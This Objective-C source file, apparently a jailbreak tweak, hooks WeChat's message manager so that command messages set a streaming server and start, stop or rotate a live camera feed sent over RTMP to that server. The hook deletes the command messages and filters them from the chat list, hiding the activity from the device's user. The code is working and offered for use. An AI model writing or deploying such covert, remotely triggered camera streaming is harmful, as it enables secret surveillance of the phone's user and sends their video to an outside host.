//
//  wx_live_hook.mm
//  wx_live_hook
//
//  Created by jyh on 2018/8/3.
//  Copyright (c) 2018年 ___ORGANIZATIONNAME___. All rights reserved.
//

// CaptainHook by Ryan Petrich
// see https://github.com/rpetrich/CaptainHook/

#if TARGET_OS_SIMULATOR
#error Do not support the simulator, please use the real iPhone Device.
#endif

#import <Foundation/Foundation.h>
#import "CaptainHook/CaptainHook.h"
#include <notify.h>
#import "LiveHookHeader.h"
#import "HGLiveManager.h"

CHDeclareClass(CMessageMgr); // declare class

CHOptimizedMethod2(self, void, CMessageMgr, AsyncOnAddMsg, id, arg1, MsgWrap, CMessageWrap *, wrap) {

    NSLog(@"%@",NSHomeDirectory());
    NSLog(@"---------------AsyncOnAddMsg----------------");
    CContactMgr *contactManager = [[objc_getClass("MMServiceCenter") defaultCenter] getService:[objc_getClass("CContactMgr") class]];
    CContact *selfContact = [contactManager getSelfContact];
    
    if ([wrap.m_nsFromUsr isEqualToString:selfContact.m_nsUsrName]) {
        if ([wrap.m_nsContent isEqualToString:sheZhiFuWuQiWeiSheZhi]) {
            return;
        }
    }

    if ([wrap.m_nsContent hasPrefix:sheZhiFuWuQi]) {
        NSString *fwq = [wrap.m_nsContent stringByReplacingOccurrencesOfString:@":" withString:@""];
        fwq = [fwq stringByReplacingOccurrencesOfString:@"：" withString:@""];
        fwq = [fwq stringByReplacingOccurrencesOfString:@" " withString:@""];
        fwq = [fwq stringByReplacingOccurrencesOfString:@"#服务器" withString:@""];
        
        NSString *room = [selfContact.m_nsUsrName stringByReplacingOccurrencesOfString:@"wxid_" withString:@""];
        
        NSString *rtmpAddress = [NSString stringWithFormat:@"rtmp://%@:2018/hls/%@",fwq ,room];
        NSString *httpAddress = [NSString stringWithFormat:@"http://%@:8080/hls/%@.m3u8",fwq, room];
        NSUserDefaults *ud = [NSUserDefaults standardUserDefaults];
        [ud setObject:rtmpAddress forKey:@"rtmpAddress"];
        [ud setObject:httpAddress forKey:@"httpAddress"];
        [ud synchronize]; //立即写入
        [self DelMsg:arg1 MsgWrap:wrap];
        return;
    }
    
    if ([wrap.m_nsContent isEqualToString:start]) {
        CMessageWrap *newWrap = wrap;
        [self DelMsg:arg1 MsgWrap:wrap];
        newWrap.m_nsFromUsr = selfContact.m_nsUsrName;
        newWrap.m_nsToUsr = arg1;
        newWrap.m_uiMesLocalID = 0;
        newWrap.m_n64MesSvrID = 0;
        newWrap.m_uiStatus = 1;
        newWrap.m_uiMessageType = 1;
        newWrap.m_nsMsgSource = nil;
        
        NSUserDefaults *ud = [NSUserDefaults standardUserDefaults];
        NSString *rtmpAddress = [ud objectForKey:@"rtmpAddress"];
        NSString *httpAddress = [ud objectForKey:@"httpAddress"];
        
        if (rtmpAddress == nil || httpAddress == nil) {
            newWrap.m_nsContent = sheZhiFuWuQiWeiSheZhi;
            [self AddMsg:arg1 MsgWrap:newWrap];
            [self DelMsg:arg1 MsgWrap:newWrap];
            return;
        }
        
        newWrap.m_nsContent = [NSString stringWithFormat:@"#播放地址,网页地址:%@,播放器地址:%@",httpAddress,rtmpAddress];
        [self AddMsg:arg1 MsgWrap:newWrap];
        [self DelMsg:arg1 MsgWrap:newWrap];
        
        [[HGLiveManager share] stopLive];
        [[HGLiveManager share] startRunning:[UIView new] rtmpAddress:rtmpAddress];
    }
    
    if ([wrap.m_nsContent isEqualToString:stop]) {
        [[HGLiveManager share] stopLive];
        [self DelMsg:arg1 MsgWrap:wrap];
        return;
    }
    
    if ([wrap.m_nsContent isEqualToString:rotate]) {
        [[HGLiveManager share] rotateCamera];
        [self DelMsg:arg1 MsgWrap:wrap];
        return;
    }
    
    if ([wrap.m_nsFromUsr isEqualToString:selfContact.m_nsUsrName]) {
        if ([wrap.m_nsContent isEqualToString:start] || [wrap.m_nsContent isEqualToString:stop] || [wrap.m_nsContent isEqualToString:rotate] || [wrap.m_nsContent hasPrefix:shiPingDiZhi] || [wrap.m_nsContent hasPrefix:sheZhiFuWuQi] || [wrap.m_nsContent isEqualToString:sheZhiFuWuQiWeiSheZhi]) {
            return;
        }
    }
    
	CHSuper(2,CMessageMgr, AsyncOnAddMsg, arg1, MsgWrap, wrap);
}

// 聊天列表显示过滤
CHOptimizedMethod2(self, void, CMessageMgr, AsyncOnAddMsgListForSession, NSDictionary *, arg1, NotifyUsrName, NSMutableSet *, arg2) {
    
    NSLog(@"---------------AsyncOnAddMsgListForSession----------------");
    
    CMessageWrap *wrap = arg1[[arg2 anyObject]];
    if ([wrap.m_nsContent isEqualToString:start] || [wrap.m_nsContent isEqualToString:stop] || [wrap.m_nsContent isEqualToString:rotate] || [wrap.m_nsContent hasPrefix:shiPingDiZhi] || [wrap.m_nsContent hasPrefix:sheZhiFuWuQi] || [wrap.m_nsContent isEqualToString:sheZhiFuWuQiWeiSheZhi]) {
        return;
    }
    CHSuper2(CMessageMgr, AsyncOnAddMsgListForSession, arg1, NotifyUsrName, arg2);
}


CHConstructor // code block that runs immediately upon load
{
	@autoreleasepool
	{
        CHLoadLateClass(CMessageMgr);
        CHHook2(CMessageMgr, AsyncOnAddMsg, MsgWrap);
        CHHook2(CMessageMgr, AsyncOnAddMsgListForSession, NotifyUsrName);

	}
}
